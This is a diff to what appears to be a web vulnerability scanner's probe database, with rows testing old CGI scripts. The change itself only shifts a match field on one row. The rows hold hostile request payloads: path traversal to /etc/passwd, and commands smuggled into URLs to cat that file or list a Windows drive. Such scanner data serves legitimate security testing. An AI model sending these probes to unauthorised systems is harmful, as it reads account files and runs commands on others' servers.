@@ -89,7 +89,7 @@
 "000062","0","7","@CGIDIRShtml2wml.cgi","GET","200","","","","","Html2Wml < 0.4.8 access local files via CGI, and more","",""
 "000063","358","7","@CGIDIRSpollit/Poll_It_SSI_v2.0.cgi?data_dir=\etc\passwd%00","GET","root:","","","","","Poll_It_SSI_v2.0.cgi allows attackers to retrieve arbitrary files.","",""
 "000064","0","8","@CGIDIRSecho.bat?&dir+c:\\","GET","200","","","","","This batch file may allow attackers to execute remote commands.","",""
-"000065","0","8","@CGIDIRSexcite;IFS=\"$\";/bin/cat /etc/passwd","GET","root:","200","","","","Excite software is vulnerable to command execution.","",""
+"000065","0","8","@CGIDIRSexcite;IFS=\"$\";/bin/cat /etc/passwd","GET","root:","","200","","","Excite software is vulnerable to command execution.","",""
 "000066","0","8","@CGIDIRSezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|","GET","200","","","","","EZShopper loadpage CGI command execution","",""
 "000067","0","8","@CGIDIRSguestbook.cgi","GET","200","","","","","May allow attackers to execute commands as the web daemon.","",""
 "000068","0","8","@CGIDIRSguestbook.pl","GET","200","","","","","May allow attackers to execute commands as the web daemon.","",""
